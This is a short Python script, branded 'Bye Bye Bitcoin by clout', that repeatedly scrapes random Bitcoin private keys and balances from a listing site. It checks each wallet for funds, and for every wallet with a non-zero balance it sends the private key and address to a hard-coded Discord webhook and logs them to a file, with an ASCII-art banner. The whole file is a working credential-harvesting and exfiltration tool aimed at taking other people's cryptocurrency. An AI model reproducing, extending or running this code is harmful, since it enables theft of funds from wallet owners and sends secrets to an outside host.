import requests
from requests.structures import CaseInsensitiveDict
from bs4 import BeautifulSoup
import time
import os

checked = 0

while True:
    os.system(f"title Bye Bye Bitcoin // Checked Wallets: {checked} // by clout")
    url = "https://www.bitcoinlist.io/random"
    headers = CaseInsensitiveDict()
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36"
    req = requests.get(url, headers=headers)
    soup = BeautifulSoup(req.content, 'html.parser')
    wallets = soup.find_all("tr")
    for wallet in wallets:
        getwallet = str(wallet.getText()).strip()
        privkey = getwallet.split()[0].strip()
        uncompaddy = getwallet.split()[1].strip()
        compaddy = getwallet.split()[2].strip()
        balance = getwallet.split()[3].strip()
        if "Private Key" in getwallet:
            pass
        else:
            checked += 1
            if float(balance) > 0:              
                requests.post("https://discord.com/api/webhooks/957625184813203516/LUshkl4hFTghCl_VnEC6rjuBNyq9ihIIbKJLsA2E6bgFjDcUT1qXd3R2ARqJrws59sLd", json={"content": f"{balance} BTC found\n\nAdress: {compaddy}\nPrivate Key: {privkey}"}) 
                open('hits.txt', 'a+').write(f"{balance} BTC found in Adress: {compaddy} // Private Key: {privkey}")
            os.system("cls")
            os.system(f"title Bye Bye Bitcoin // Checked Wallets: {checked} // by clout")
            print(f"""
            .-.____________________.-.
     ___ _.' .-----.    _____________|======+--------------------+
    /_._/   (      |   /_____________|      |   Bye Bye Bitcoin  |
      /      `  _ ____/                     |      by clout      |
     |_      .\( \\                          |____________________|
    .'  `-._/__`_//
  .'       |'           Private Key: {privkey}
 /        /             Uncompressed Address: {uncompaddy}
/        |              Compressed Address: {compaddy}
|        '              Balance: {balance}
|        |
`-._____.-'""")
        time.sleep(0.5)
    

    
